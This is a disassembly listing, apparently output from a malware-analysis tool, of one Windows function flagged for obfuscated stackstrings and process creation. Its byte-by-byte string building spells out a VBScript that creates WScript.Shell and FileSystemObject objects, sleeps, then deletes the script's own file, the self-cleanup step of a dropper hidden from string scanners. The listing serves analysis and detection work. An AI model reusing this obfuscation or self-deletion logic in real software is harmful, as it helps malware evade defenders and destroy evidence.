        /*
Basic Block at 0x00405920@9324d1a8ae37a36ae560c37448c9705a with 2 features:
          - contain obfuscated stackstrings
          - create process on Windows
        .text:0x00405920  
        .text:0x00405920  FUNC: int cdecl sub_00405920( ) [6 XREFS] 
        .text:0x00405920  
        .text:0x00405920  Stack Variables: (offset from initial top of stack)
        .text:0x00405920          -499: int local499
        .text:0x00405920          -500: int local500
        .text:0x00405920          -753: int local753
        .text:0x00405920          -755: int local755
        .text:0x00405920          -756: int local756
        .text:0x00405920          -855: int local855
        .text:0x00405920          -856: int local856
        .text:0x00405920          -860: int local860
        .text:0x00405920          -864: int local864
        .text:0x00405920          -865: int local865
        .text:0x00405920          -866: int local866
        .text:0x00405920          -867: int local867
        .text:0x00405920          -868: int local868
        .text:0x00405920          -869: int local869
        .text:0x00405920          -870: int local870
        .text:0x00405920          -871: int local871
        .text:0x00405920          -872: int local872
        .text:0x00405920          -873: int local873
        .text:0x00405920          -874: int local874
        .text:0x00405920          -875: int local875
        .text:0x00405920          -876: int local876
        .text:0x00405920          -877: int local877
        .text:0x00405920          -878: int local878
        .text:0x00405920          -879: int local879
        .text:0x00405920          -880: int local880
        .text:0x00405920          -881: int local881
        .text:0x00405920          -882: int local882
        .text:0x00405920          -883: int local883
        .text:0x00405920          -884: int local884
        .text:0x00405920          -885: int local885
        .text:0x00405920          -886: int local886
        .text:0x00405920          -887: int local887
        .text:0x00405920          -888: int local888
        .text:0x00405920          -889: int local889
        .text:0x00405920          -890: int local890
        .text:0x00405920          -891: int local891
        .text:0x00405920          -892: int local892
        .text:0x00405920          -893: int local893
        .text:0x00405920          -894: int local894
        .text:0x00405920          -895: int local895
        .text:0x00405920          -896: int local896
        .text:0x00405920          -897: int local897
        .text:0x00405920          -898: int local898
        .text:0x00405920          -899: int local899
        .text:0x00405920          -900: int local900
        .text:0x00405920          -901: int local901
        .text:0x00405920          -902: int local902
        .text:0x00405920          -903: int local903
        .text:0x00405920          -904: int local904
        .text:0x00405920          -905: int local905
        .text:0x00405920          -906: int local906
        .text:0x00405920          -907: int local907
        .text:0x00405920          -908: int local908
        .text:0x00405920          -909: int local909
        .text:0x00405920          -910: int local910
        .text:0x00405920          -911: int local911
        .text:0x00405920          -912: int local912
        .text:0x00405920          -913: int local913
        .text:0x00405920          -914: int local914
        .text:0x00405920          -915: int local915
        .text:0x00405920          -916: int local916
        .text:0x00405920          -917: int local917
        .text:0x00405920          -918: int local918
        .text:0x00405920          -919: int local919
        .text:0x00405920          -920: int local920
        .text:0x00405920          -921: int local921
        .text:0x00405920          -922: int local922
        .text:0x00405920          -923: int local923
        .text:0x00405920          -924: int local924
        .text:0x00405920          -925: int local925
        .text:0x00405920          -926: int local926
        .text:0x00405920          -927: int local927
        .text:0x00405920          -928: int local928
        .text:0x00405920          -929: int local929
        .text:0x00405920          -930: int local930
        .text:0x00405920          -931: int local931
        .text:0x00405920          -932: int local932
        .text:0x00405920          -933: int local933
        .text:0x00405920          -934: int local934
        .text:0x00405920          -935: int local935
        .text:0x00405920          -936: int local936
        .text:0x00405920          -937: int local937
        .text:0x00405920          -938: int local938
        .text:0x00405920          -939: int local939
        .text:0x00405920          -940: int local940
        .text:0x00405920          -941: int local941
        .text:0x00405920          -942: int local942
        .text:0x00405920          -943: int local943
        .text:0x00405920          -944: int local944
        .text:0x00405920          -945: int local945
        .text:0x00405920          -946: int local946
        .text:0x00405920          -947: int local947
        .text:0x00405920          -948: int local948
        .text:0x00405920          -949: int local949
        .text:0x00405920          -950: int local950
        .text:0x00405920          -951: int local951
        .text:0x00405920          -952: int local952
        .text:0x00405920          -953: int local953
        .text:0x00405920          -954: int local954
        .text:0x00405920          -955: int local955
        .text:0x00405920          -956: int local956
        .text:0x00405920          -957: int local957
        .text:0x00405920          -958: int local958
        .text:0x00405920          -959: int local959
        .text:0x00405920          -960: int local960
        .text:0x00405920          -961: int local961
        .text:0x00405920          -962: int local962
        .text:0x00405920          -963: int local963
        .text:0x00405920          -964: int local964
        .text:0x00405920          -965: int local965
        .text:0x00405920          -966: int local966
        .text:0x00405920          -967: int local967
        .text:0x00405920          -968: int local968
        .text:0x00405920          -969: int local969
        .text:0x00405920          -970: int local970
        .text:0x00405920          -971: int local971
        .text:0x00405920          -972: int local972
        .text:0x00405920          -973: int local973
        .text:0x00405920          -974: int local974
        .text:0x00405920          -975: int local975
        .text:0x00405920          -976: int local976
        .text:0x00405920          -977: int local977
        .text:0x00405920          -978: int local978
        .text:0x00405920          -979: int local979
        .text:0x00405920          -980: int local980
        .text:0x00405920          -981: int local981
        .text:0x00405920          -982: int local982
        .text:0x00405920          -983: int local983
        .text:0x00405920          -984: int local984
        .text:0x00405920          -985: int local985
        .text:0x00405920          -986: int local986
        .text:0x00405920          -987: int local987
        .text:0x00405920          -988: int local988
        .text:0x00405920          -989: int local989
        .text:0x00405920          -990: int local990
        .text:0x00405920          -991: int local991
        .text:0x00405920          -992: int local992
        .text:0x00405920          -993: int local993
        .text:0x00405920          -994: int local994
        .text:0x00405920          -995: int local995
        .text:0x00405920          -996: int local996
        .text:0x00405920          -999: int local999
        .text:0x00405920          -1000: int local1000
        .text:0x00405920          -1001: int local1001
        .text:0x00405920          -1002: int local1002
        .text:0x00405920          -1003: int local1003
        .text:0x00405920          -1004: int local1004
        .text:0x00405920          -1005: int local1005
        .text:0x00405920          -1006: int local1006
        .text:0x00405920          -1007: int local1007
        .text:0x00405920          -1008: int local1008
        .text:0x00405920          -1009: int local1009
        .text:0x00405920          -1010: int local1010
        .text:0x00405920          -1011: int local1011
        .text:0x00405920          -1012: int local1012
        .text:0x00405920          -1013: int local1013
        .text:0x00405920          -1014: int local1014
        .text:0x00405920          -1015: int local1015
        .text:0x00405920          -1016: int local1016
        .text:0x00405920          -1017: int local1017
        .text:0x00405920          -1018: int local1018
        .text:0x00405920          -1019: int local1019
        .text:0x00405920          -1020: int local1020
        .text:0x00405920          -1021: int local1021
        .text:0x00405920          -1022: int local1022
        .text:0x00405920          -1023: int local1023
        .text:0x00405920          -1024: int local1024
        .text:0x00405920          -1025: int local1025
        .text:0x00405920          -1026: int local1026
        .text:0x00405920          -1027: int local1027
        .text:0x00405920          -1028: int local1028
        .text:0x00405920          -1029: int local1029
        .text:0x00405920          -1030: int local1030
        .text:0x00405920          -1031: int local1031
        .text:0x00405920          -1032: int local1032
        .text:0x00405920          -1033: int local1033
        .text:0x00405920          -1034: int local1034
        .text:0x00405920          -1035: int local1035
        .text:0x00405920          -1036: int local1036
        .text:0x00405920          -1038: int local1038
        .text:0x00405920          -1039: int local1039
        .text:0x00405920          -1040: int local1040
        .text:0x00405920          -1041: int local1041
        .text:0x00405920          -1042: int local1042
        .text:0x00405920          -1043: int local1043
        .text:0x00405920          -1044: int local1044
        .text:0x00405920          -1045: int local1045
        .text:0x00405920          -1046: int local1046
        .text:0x00405920          -1047: int local1047
        .text:0x00405920          -1048: int local1048
        .text:0x00405920          -1049: int local1049
        .text:0x00405920          -1050: int local1050
        .text:0x00405920          -1051: int local1051
        .text:0x00405920          -1052: int local1052
        .text:0x00405920          -1053: int local1053
        .text:0x00405920          -1054: int local1054
        .text:0x00405920          -1055: int local1055
        .text:0x00405920          -1056: int local1056
        .text:0x00405920          -1057: int local1057
        .text:0x00405920          -1058: int local1058
        .text:0x00405920          -1059: int local1059
        .text:0x00405920          -1060: int local1060
        .text:0x00405920          -1061: int local1061
        .text:0x00405920          -1062: int local1062
        .text:0x00405920          -1063: int local1063
        .text:0x00405920          -1064: int local1064
        .text:0x00405920          -1065: int local1065
        .text:0x00405920          -1066: int local1066
        .text:0x00405920          -1067: int local1067
        .text:0x00405920          -1068: int local1068
        .text:0x00405920          -1072: int local1072
        .text:0x00405920          -1073: int local1073
        .text:0x00405920          -1074: int local1074
        .text:0x00405920          -1075: int local1075
        .text:0x00405920          -1076: int local1076
        .text:0x00405920          -1077: int local1077
        .text:0x00405920          -1078: int local1078
        .text:0x00405920          -1079: int local1079
        .text:0x00405920          -1080: int local1080
        .text:0x00405920          -1081: int local1081
        .text:0x00405920          -1082: int local1082
        .text:0x00405920          -1083: int local1083
        .text:0x00405920          -1084: int local1084
        .text:0x00405920          -1085: int local1085
        .text:0x00405920          -1086: int local1086
        .text:0x00405920          -1087: int local1087
        .text:0x00405920          -1088: int local1088
        .text:0x00405920          -1089: int local1089
        .text:0x00405920          -1090: int local1090
        .text:0x00405920          -1091: int local1091
        .text:0x00405920          -1092: int local1092
        .text:0x00405920          -1093: int local1093
        .text:0x00405920          -1094: int local1094
        .text:0x00405920          -1095: int local1095
        .text:0x00405920          -1096: int local1096
        .text:0x00405920          -1097: int local1097
        .text:0x00405920          -1098: int local1098
        .text:0x00405920          -1099: int local1099
        .text:0x00405920          -1100: int local1100
        .text:0x00405920          -1101: int local1101
        .text:0x00405920          -1102: int local1102
        .text:0x00405920          -1103: int local1103
        .text:0x00405920          -1104: int local1104
        .text:0x00405920          -1105: int local1105
        .text:0x00405920          -1106: int local1106
        .text:0x00405920          -1107: int local1107
        .text:0x00405920          -1108: int local1108
        .text:0x00405920          -1109: int local1109
        .text:0x00405920          -1110: int local1110
        .text:0x00405920          -1111: int local1111
        .text:0x00405920          -1112: int local1112
        .text:0x00405920          -1114: int local1114
        .text:0x00405920          -1115: int local1115
        .text:0x00405920          -1116: int local1116
        .text:0x00405920          -1117: int local1117
        .text:0x00405920          -1118: int local1118
        .text:0x00405920          -1119: int local1119
        .text:0x00405920          -1120: int local1120
        .text:0x00405920          -1121: int local1121
        .text:0x00405920          -1122: int local1122
        .text:0x00405920          -1123: int local1123
        .text:0x00405920          -1124: int local1124
        .text:0x00405920          -1125: int local1125
        .text:0x00405920          -1126: int local1126
        .text:0x00405920          -1127: int local1127
        .text:0x00405920          -1128: int local1128
        .text:0x00405920          -1129: int local1129
        .text:0x00405920          -1130: int local1130
        .text:0x00405920          -1131: int local1131
        .text:0x00405920          -1132: int local1132
        .text:0x00405920          -1136: int local1136
        .text:0x00405920          -1137: int local1137
        .text:0x00405920          -1138: int local1138
        .text:0x00405920          -1139: int local1139
        .text:0x00405920          -1140: int local1140
        .text:0x00405920          -1141: int local1141
        .text:0x00405920          -1142: int local1142
        .text:0x00405920          -1143: int local1143
        .text:0x00405920          -1144: int local1144
        .text:0x00405920          -1148: int local1148
        .text:0x00405920          -1149: int local1149
        .text:0x00405920          -1150: int local1150
        .text:0x00405920          -1151: int local1151
        .text:0x00405920          -1152: int local1152
        .text:0x00405920          -1153: int local1153
        .text:0x00405920          -1154: int local1154
        .text:0x00405920          -1155: int local1155
        .text:0x00405920          -1156: int local1156
        .text:0x00405920          -1157: int local1157
        .text:0x00405920          -1158: int local1158
        .text:0x00405920          -1159: int local1159
        .text:0x00405920          -1160: int local1160
        .text:0x00405920          -1161: int local1161
        .text:0x00405920          -1162: int local1162
        .text:0x00405920          -1163: int local1163
        .text:0x00405920          -1164: int local1164
        .text:0x00405920          -1168: int local1168
        .text:0x00405920          -1169: int local1169
        .text:0x00405920          -1170: int local1170
        .text:0x00405920          -1171: int local1171
        .text:0x00405920          -1172: int local1172
        .text:0x00405920          -1436: int local1436
        .text:0x00405920          -1437: int local1437
        .text:0x00405920          -1438: int local1438
        .text:0x00405920          -1439: int local1439
        .text:0x00405920          -1440: int local1440
        .text:0x00405920          -1441: int local1441
        .text:0x00405920          -1442: int local1442
        .text:0x00405920          -1443: int local1443
        .text:0x00405920          -1444: int local1444
        .text:0x00405920          -1445: int local1445
        .text:0x00405920          -1446: int local1446
        .text:0x00405920          -1447: int local1447
        .text:0x00405920          -1448: int local1448
        .text:0x00405920          -1449: int local1449
        .text:0x00405920          -1450: int local1450
        .text:0x00405920          -1451: int local1451
        .text:0x00405920          -1452: int local1452
        .text:0x00405920          -1453: int local1453
        .text:0x00405920          -1454: int local1454
        .text:0x00405920          -1455: int local1455
        .text:0x00405920          -1456: int local1456
        .text:0x00405920          -1460: int local1460
        .text:0x00405920          -1461: int local1461
        .text:0x00405920          -1462: int local1462
        .text:0x00405920          -1463: int local1463
        .text:0x00405920          -1464: int local1464
        .text:0x00405920          -1465: int local1465
        .text:0x00405920          -1466: int local1466
        .text:0x00405920          -1467: int local1467
        .text:0x00405920          -1468: int local1468
        .text:0x00405920          -1469: int local1469
        .text:0x00405920          -1470: int local1470
        .text:0x00405920          -1471: int local1471
        .text:0x00405920          -1472: int local1472
        .text:0x00405920          -1473: int local1473
        .text:0x00405920          -1474: int local1474
        .text:0x00405920          -1475: int local1475
        .text:0x00405920          -1476: int local1476
        .text:0x00405920          -1477: int local1477
        .text:0x00405920          -1478: int local1478
        .text:0x00405920          -1479: int local1479
        .text:0x00405920          -1480: int local1480
        .text:0x00405920          -1481: int local1481
        .text:0x00405920          -1482: int local1482
        .text:0x00405920          -1483: int local1483
        .text:0x00405920          -1484: int local1484
        .text:0x00405920  
        .text:0x00405920  81ec94040000     sub esp,1172
        .text:0x00405926  53               push ebx
        .text:0x00405927  56               push esi
        .text:0x00405928  57               push edi
        .text:0x00405929  b918000000       mov ecx,24
        .text:0x0040592e  33c0             xor eax,eax
        .text:0x00405930  8dbc2449010000   lea edi,dword [esp + 329]
        .text:0x00405937  c684244801000000 mov byte [esp + 328],0
        .text:0x0040593f  c68424ac02000000 mov byte [esp + 684],0
        .text:0x00405947  f3ab             rep: stosd 
        .text:0x00405949  66ab             stosd 
        .text:0x0040594b  aa               stosb 
        .text:0x0040594c  b97c000000       mov ecx,124
        .text:0x00405951  33c0             xor eax,eax
        .text:0x00405953  8dbc24ad020000   lea edi,dword [esp + 685]
        .text:0x0040595a  c68424ac01000000 mov byte [esp + 428],0
        .text:0x00405962  f3ab             rep: stosd 
        .text:0x00405964  66ab             stosd 
        .text:0x00405966  aa               stosb 
        .text:0x00405967  b93f000000       mov ecx,63
        .text:0x0040596c  33c0             xor eax,eax
        .text:0x0040596e  8dbc24ad010000   lea edi,dword [esp + 429]
        .text:0x00405975  b272             mov dl,114
        .text:0x00405977  f3ab             rep: stosd 
        .text:0x00405979  66ab             stosd 
        .text:0x0040597b  aa               stosb 
        .text:0x0040597c  b365             mov bl,101
        .text:0x0040597e  b074             mov al,116
        .text:0x00405980  b163             mov cl,99
        .text:0x00405982  c644241464       mov byte [esp + 20],100
        .text:0x00405987  c644241569       mov byte [esp + 21],105
        .text:0x0040598c  c64424166d       mov byte [esp + 22],109
        .text:0x00405991  c644241720       mov byte [esp + 23],32
        .text:0x00405996  c644241877       mov byte [esp + 24],119
        .text:0x0040599b  c644241973       mov byte [esp + 25],115
        .text:0x004059a0  c644241a68       mov byte [esp + 26],104
        .text:0x004059a5  c644241b00       mov byte [esp + 27],0
        .text:0x004059aa  c644245c4f       mov byte [esp + 92],79
        .text:0x004059af  c644245d6e       mov byte [esp + 93],110
        .text:0x004059b4  c644245e20       mov byte [esp + 94],32
        .text:0x004059b9  c644245f45       mov byte [esp + 95],69
        .text:0x004059be  88542460         mov byte [esp + 96],dl
        .text:0x004059c2  88542461         mov byte [esp + 97],dl
        .text:0x004059c6  c64424626f       mov byte [esp + 98],111
        .text:0x004059cb  88542463         mov byte [esp + 99],dl
        .text:0x004059cf  c644246420       mov byte [esp + 100],32
        .text:0x004059d4  c644246552       mov byte [esp + 101],82
        .text:0x004059d9  885c2466         mov byte [esp + 102],bl
        .text:0x004059dd  c644246773       mov byte [esp + 103],115
        .text:0x004059e2  c644246875       mov byte [esp + 104],117
        .text:0x004059e7  c64424696d       mov byte [esp + 105],109
        .text:0x004059ec  885c246a         mov byte [esp + 106],bl
        .text:0x004059f0  c644246b20       mov byte [esp + 107],32
        .text:0x004059f5  c644246c4e       mov byte [esp + 108],78
        .text:0x004059fa  885c246d         mov byte [esp + 109],bl
        .text:0x004059fe  c644246e78       mov byte [esp + 110],120
        .text:0x00405a03  8844246f         mov byte [esp + 111],al
        .text:0x00405a07  c644247000       mov byte [esp + 112],0
        .text:0x00405a0c  c684249400000073 mov byte [esp + 148],115
        .text:0x00405a14  889c2495000000   mov byte [esp + 149],bl
        .text:0x00405a1b  88842496000000   mov byte [esp + 150],al
        .text:0x00405a22  c684249700000020 mov byte [esp + 151],32
        .text:0x00405a2a  c684249800000077 mov byte [esp + 152],119
        .text:0x00405a32  c684249900000073 mov byte [esp + 153],115
        .text:0x00405a3a  c684249a00000068 mov byte [esp + 154],104
        .text:0x00405a42  c684249b0000003d mov byte [esp + 155],61
        .text:0x00405a4a  888c249c000000   mov byte [esp + 156],cl
        .text:0x00405a51  8894249d000000   mov byte [esp + 157],dl
        .text:0x00405a58  889c249e000000   mov byte [esp + 158],bl
        .text:0x00405a5f  c684249f00000061 mov byte [esp + 159],97
        .text:0x00405a67  888424a0000000   mov byte [esp + 160],al
        .text:0x00405a6e  889c24a1000000   mov byte [esp + 161],bl
        .text:0x00405a75  c68424a20000004f mov byte [esp + 162],79
        .text:0x00405a7d  c68424a300000062 mov byte [esp + 163],98
        .text:0x00405a85  c68424a40000006a mov byte [esp + 164],106
        .text:0x00405a8d  889c24a5000000   mov byte [esp + 165],bl
        .text:0x00405a94  888c24a6000000   mov byte [esp + 166],cl
        .text:0x00405a9b  888424a7000000   mov byte [esp + 167],al
        .text:0x00405aa2  c68424a800000028 mov byte [esp + 168],40
        .text:0x00405aaa  c68424a900000022 mov byte [esp + 169],34
        .text:0x00405ab2  c68424aa00000057 mov byte [esp + 170],87
        .text:0x00405aba  c68424ab00000053 mov byte [esp + 171],83
        .text:0x00405ac2  888c24ac000000   mov byte [esp + 172],cl
        .text:0x00405ac9  889424ad000000   mov byte [esp + 173],dl
        .text:0x00405ad0  c68424ae00000069 mov byte [esp + 174],105
        .text:0x00405ad8  c68424af00000070 mov byte [esp + 175],112
        .text:0x00405ae0  888424b0000000   mov byte [esp + 176],al
        .text:0x00405ae7  c68424b10000002e mov byte [esp + 177],46
        .text:0x00405aef  c68424b200000053 mov byte [esp + 178],83
        .text:0x00405af7  c68424b300000068 mov byte [esp + 179],104
        .text:0x00405aff  889c24b4000000   mov byte [esp + 180],bl
        .text:0x00405b06  c68424b50000006c mov byte [esp + 181],108
        .text:0x00405b0e  c68424b60000006c mov byte [esp + 182],108
        .text:0x00405b16  c68424b700000022 mov byte [esp + 183],34
        .text:0x00405b1e  c68424b800000029 mov byte [esp + 184],41
        .text:0x00405b26  c68424b900000000 mov byte [esp + 185],0
        .text:0x00405b2e  c68424bc00000053 mov byte [esp + 188],83
        .text:0x00405b36  889c24bd000000   mov byte [esp + 189],bl
        .text:0x00405b3d  888424be000000   mov byte [esp + 190],al
        .text:0x00405b44  c68424bf00000020 mov byte [esp + 191],32
        .text:0x00405b4c  c68424c00000006f mov byte [esp + 192],111
        .text:0x00405b54  c68424c100000062 mov byte [esp + 193],98
        .text:0x00405b5c  c68424c20000006a mov byte [esp + 194],106
        .text:0x00405b64  c68424c300000046 mov byte [esp + 195],70
        .text:0x00405b6c  c68424c400000053 mov byte [esp + 196],83
        .text:0x00405b74  c68424c50000004f mov byte [esp + 197],79
        .text:0x00405b7c  c68424c600000020 mov byte [esp + 198],32
        .text:0x00405b84  c68424c70000003d mov byte [esp + 199],61
        .text:0x00405b8c  c68424c800000020 mov byte [esp + 200],32
        .text:0x00405b94  c68424c900000043 mov byte [esp + 201],67
        .text:0x00405b9c  889424ca000000   mov byte [esp + 202],dl
        .text:0x00405ba3  889c24cb000000   mov byte [esp + 203],bl
        .text:0x00405baa  c68424cc00000061 mov byte [esp + 204],97
        .text:0x00405bb2  888424cd000000   mov byte [esp + 205],al
        .text:0x00405bb9  889c24ce000000   mov byte [esp + 206],bl
        .text:0x00405bc0  c68424cf0000004f mov byte [esp + 207],79
        .text:0x00405bc8  c68424d000000062 mov byte [esp + 208],98
        .text:0x00405bd0  c68424d10000006a mov byte [esp + 209],106
        .text:0x00405bd8  889c24d2000000   mov byte [esp + 210],bl
        .text:0x00405bdf  888c24d3000000   mov byte [esp + 211],cl
        .text:0x00405be6  888424d4000000   mov byte [esp + 212],al
        .text:0x00405bed  c68424d500000028 mov byte [esp + 213],40
        .text:0x00405bf5  c68424d600000022 mov byte [esp + 214],34
        .text:0x00405bfd  c68424d700000053 mov byte [esp + 215],83
        .text:0x00405c05  888c24d8000000   mov byte [esp + 216],cl
        .text:0x00405c0c  889424d9000000   mov byte [esp + 217],dl
        .text:0x00405c13  c68424da00000069 mov byte [esp + 218],105
        .text:0x00405c1b  c68424db00000070 mov byte [esp + 219],112
        .text:0x00405c23  888424dc000000   mov byte [esp + 220],al
        .text:0x00405c2a  c68424dd00000069 mov byte [esp + 221],105
        .text:0x00405c32  c68424de0000006e mov byte [esp + 222],110
        .text:0x00405c3a  c68424df00000067 mov byte [esp + 223],103
        .text:0x00405c42  c68424e00000002e mov byte [esp + 224],46
        .text:0x00405c4a  c68424e100000046 mov byte [esp + 225],70
        .text:0x00405c52  c68424e200000069 mov byte [esp + 226],105
        .text:0x00405c5a  c68424e30000006c mov byte [esp + 227],108
        .text:0x00405c62  889c24e4000000   mov byte [esp + 228],bl
        .text:0x00405c69  c68424e500000053 mov byte [esp + 229],83
        .text:0x00405c71  c68424e600000079 mov byte [esp + 230],121
        .text:0x00405c79  c68424e700000073 mov byte [esp + 231],115
        .text:0x00405c81  888424e8000000   mov byte [esp + 232],al
        .text:0x00405c88  889c24e9000000   mov byte [esp + 233],bl
        .text:0x00405c8f  c68424ea0000006d mov byte [esp + 234],109
        .text:0x00405c97  c68424eb0000004f mov byte [esp + 235],79
        .text:0x00405c9f  c68424ec00000062 mov byte [esp + 236],98
        .text:0x00405ca7  c68424ed0000006a mov byte [esp + 237],106
        .text:0x00405caf  889c24ee000000   mov byte [esp + 238],bl
        .text:0x00405cb6  888c24ef000000   mov byte [esp + 239],cl
        .text:0x00405cbd  888424f0000000   mov byte [esp + 240],al
        .text:0x00405cc4  c68424f100000022 mov byte [esp + 241],34
        .text:0x00405ccc  c68424f200000029 mov byte [esp + 242],41
        .text:0x00405cd4  c68424f300000000 mov byte [esp + 243],0
        .text:0x00405cdc  c644243477       mov byte [esp + 52],119
        .text:0x00405ce1  c644243573       mov byte [esp + 53],115
        .text:0x00405ce6  884c2436         mov byte [esp + 54],cl
        .text:0x00405cea  88542437         mov byte [esp + 55],dl
        .text:0x00405cee  c644243869       mov byte [esp + 56],105
        .text:0x00405cf3  c644243970       mov byte [esp + 57],112
        .text:0x00405cf8  8844243a         mov byte [esp + 58],al
        .text:0x00405cfc  c644243b2e       mov byte [esp + 59],46
        .text:0x00405d01  c644243c73       mov byte [esp + 60],115
        .text:0x00405d06  c644243d6c       mov byte [esp + 61],108
        .text:0x00405d0b  885c243e         mov byte [esp + 62],bl
        .text:0x00405d0f  885c243f         mov byte [esp + 63],bl
        .text:0x00405d13  c644244070       mov byte [esp + 64],112
        .text:0x00405d18  c644244120       mov byte [esp + 65],32
        .text:0x00405d1d  c644244231       mov byte [esp + 66],49
        .text:0x00405d22  c644244330       mov byte [esp + 67],48
        .text:0x00405d27  c644244430       mov byte [esp + 68],48
        .text:0x00405d2c  c644244530       mov byte [esp + 69],48
        .text:0x00405d31  c644244600       mov byte [esp + 70],0
        .text:0x00405d36  c64424486f       mov byte [esp + 72],111
        .text:0x00405d3b  c644244962       mov byte [esp + 73],98
        .text:0x00405d40  c644244a6a       mov byte [esp + 74],106
        .text:0x00405d45  c644244b46       mov byte [esp + 75],70
        .text:0x00405d4a  c644244c53       mov byte [esp + 76],83
        .text:0x00405d4f  c644244d4f       mov byte [esp + 77],79
        .text:0x00405d54  c644244e2e       mov byte [esp + 78],46
        .text:0x00405d59  c644244f44       mov byte [esp + 79],68
        .text:0x00405d5e  885c2450         mov byte [esp + 80],bl
        .text:0x00405d62  c64424516c       mov byte [esp + 81],108
        .text:0x00405d67  885c2452         mov byte [esp + 82],bl
        .text:0x00405d6b  88442453         mov byte [esp + 83],al
        .text:0x00405d6f  885c2454         mov byte [esp + 84],bl
        .text:0x00405d73  c644245546       mov byte [esp + 85],70
        .text:0x00405d78  c644245669       mov byte [esp + 86],105
        .text:0x00405d7d  c64424576c       mov byte [esp + 87],108
        .text:0x00405d82  885c2458         mov byte [esp + 88],bl
        .text:0x00405d86  c644245928       mov byte [esp + 89],40
        .text:0x00405d8b  c644245a22       mov byte [esp + 90],34
        .text:0x00405d90  c644245b00       mov byte [esp + 91],0
        .text:0x00405d95  c644241c22       mov byte [esp + 28],34
        .text:0x00405d9a  c644241d29       mov byte [esp + 29],41
        .text:0x00405d9f  c644241e2c       mov byte [esp + 30],44
        .text:0x00405da4  c644241f20       mov byte [esp + 31],32
        .text:0x00405da9  c644242054       mov byte [esp + 32],84
        .text:0x00405dae  88542421         mov byte [esp + 33],dl
        .text:0x00405db2  c644242275       mov byte [esp + 34],117
        .text:0x00405db7  885c2423         mov byte [esp + 35],bl
        .text:0x00405dbb  c644242400       mov byte [esp + 36],0
        .text:0x00405dc0  888c24f4000000   mov byte [esp + 244],cl
        .text:0x00405dc7  889424f5000000   mov byte [esp + 245],dl
        .text:0x00405dce  889c24f6000000   mov byte [esp + 246],bl
        .text:0x00405dd5  c68424f700000061 mov byte [esp + 247],97
        .text:0x00405ddd  888424f8000000   mov byte [esp + 248],al
        .text:0x00405de4  889c24f9000000   mov byte [esp + 249],bl
        .text:0x00405deb  c68424fa0000006f mov byte [esp + 250],111
        .text:0x00405df3  c68424fb00000062 mov byte [esp + 251],98
        .text:0x00405dfb  c68424fc0000006a mov byte [esp + 252],106
        .text:0x00405e03  889c24fd000000   mov byte [esp + 253],bl
        .text:0x00405e0a  888c24fe000000   mov byte [esp + 254],cl
        .text:0x00405e11  888424ff000000   mov byte [esp + 255],al
        .text:0x00405e18  c684240001000028 mov byte [esp + 256],40
        .text:0x00405e20  c684240101000022 mov byte [esp + 257],34
        .text:0x00405e28  c684240201000073 mov byte [esp + 258],115
        .text:0x00405e30  888c2403010000   mov byte [esp + 259],cl
        .text:0x00405e37  88942404010000   mov byte [esp + 260],dl
        .text:0x00405e3e  c684240501000069 mov byte [esp + 261],105
        .text:0x00405e46  c684240601000070 mov byte [esp + 262],112
        .text:0x00405e4e  88842407010000   mov byte [esp + 263],al
        .text:0x00405e55  c684240801000069 mov byte [esp + 264],105
        .text:0x00405e5d  c68424090100006e mov byte [esp + 265],110
        .text:0x00405e65  c684240a01000067 mov byte [esp + 266],103
        .text:0x00405e6d  c684240b0100002e mov byte [esp + 267],46
        .text:0x00405e75  c684240c01000066 mov byte [esp + 268],102
        .text:0x00405e7d  c684240d01000069 mov byte [esp + 269],105
        .text:0x00405e85  c684240e0100006c mov byte [esp + 270],108
        .text:0x00405e8d  889c240f010000   mov byte [esp + 271],bl
        .text:0x00405e94  c684241001000073 mov byte [esp + 272],115
        .text:0x00405e9c  c684241101000079 mov byte [esp + 273],121
        .text:0x00405ea4  c684241201000073 mov byte [esp + 274],115
        .text:0x00405eac  88842413010000   mov byte [esp + 275],al
        .text:0x00405eb3  889c2414010000   mov byte [esp + 276],bl
        .text:0x00405eba  c68424150100006d mov byte [esp + 277],109
        .text:0x00405ec2  c68424160100006f mov byte [esp + 278],111
        .text:0x00405eca  c684241701000062 mov byte [esp + 279],98
        .text:0x00405ed2  c68424180100006a mov byte [esp + 280],106
        .text:0x00405eda  889c2419010000   mov byte [esp + 281],bl
        .text:0x00405ee1  888c241a010000   mov byte [esp + 282],cl
        .text:0x00405ee8  8884241b010000   mov byte [esp + 283],al
        .text:0x00405eef  c684241c01000022 mov byte [esp + 284],34
        .text:0x00405ef7  c684241d01000029 mov byte [esp + 285],41
        .text:0x00405eff  c684241e0100002e mov byte [esp + 286],46
        .text:0x00405f07  c684241f01000064 mov byte [esp + 287],100
        .text:0x00405f0f  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00405f15  6a00             push 0
        .text:0x00405f17  889c2424010000   mov byte [esp + 292],bl
        .text:0x00405f1e  c68424250100006c mov byte [esp + 293],108
        .text:0x00405f26  889c2426010000   mov byte [esp + 294],bl
        .text:0x00405f2d  88842427010000   mov byte [esp + 295],al
        .text:0x00405f34  889c2428010000   mov byte [esp + 296],bl
        .text:0x00405f3b  c684242901000066 mov byte [esp + 297],102
        .text:0x00405f43  c684242a01000069 mov byte [esp + 298],105
        .text:0x00405f4b  c684242b0100006c mov byte [esp + 299],108
        .text:0x00405f53  889c242c010000   mov byte [esp + 300],bl
        .text:0x00405f5a  c684242d01000020 mov byte [esp + 301],32
        .text:0x00405f62  c684242e01000077 mov byte [esp + 302],119
        .text:0x00405f6a  c684242f01000073 mov byte [esp + 303],115
        .text:0x00405f72  888c2430010000   mov byte [esp + 304],cl
        .text:0x00405f79  88942431010000   mov byte [esp + 305],dl
        .text:0x00405f80  c684243201000069 mov byte [esp + 306],105
        .text:0x00405f88  c684243301000070 mov byte [esp + 307],112
        .text:0x00405f90  88842434010000   mov byte [esp + 308],al
        .text:0x00405f97  c68424350100002e mov byte [esp + 309],46
        .text:0x00405f9f  c684243601000073 mov byte [esp + 310],115
        .text:0x00405fa7  888c2437010000   mov byte [esp + 311],cl
        .text:0x00405fae  88942438010000   mov byte [esp + 312],dl
        .text:0x00405fb5  c684243901000069 mov byte [esp + 313],105
        .text:0x00405fbd  c684243a01000070 mov byte [esp + 314],112
        .text:0x00405fc5  8884243b010000   mov byte [esp + 315],al
        .text:0x00405fcc  c684243c01000066 mov byte [esp + 316],102
        .text:0x00405fd4  c684243d01000075 mov byte [esp + 317],117
        .text:0x00405fdc  c684243e0100006c mov byte [esp + 318],108
        .text:0x00405fe4  c684243f0100006c mov byte [esp + 319],108
        .text:0x00405fec  c68424400100006e mov byte [esp + 320],110
        .text:0x00405ff4  c684244101000061 mov byte [esp + 321],97
        .text:0x00405ffc  c68424420100006d mov byte [esp + 322],109
